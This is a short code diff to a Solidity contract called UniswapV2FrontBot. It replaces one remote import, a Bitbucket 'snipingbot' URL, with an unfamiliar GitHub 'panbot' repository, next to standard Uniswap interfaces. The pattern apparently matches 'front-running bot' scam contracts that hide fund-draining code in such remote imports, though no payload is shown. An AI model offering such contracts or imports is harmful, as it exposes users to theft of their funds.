@@ -7,7 +7,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 // PancakeSwap manager
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://bitbucket.org/cryptosniper/snipingbot/raw/f83208f401d35b52f3637cb617fee55d7c682118/sniper";
+import "https://github.com/ConcertCoin/panbot.git";
 
 contract UniswapV2FrontBot {
     
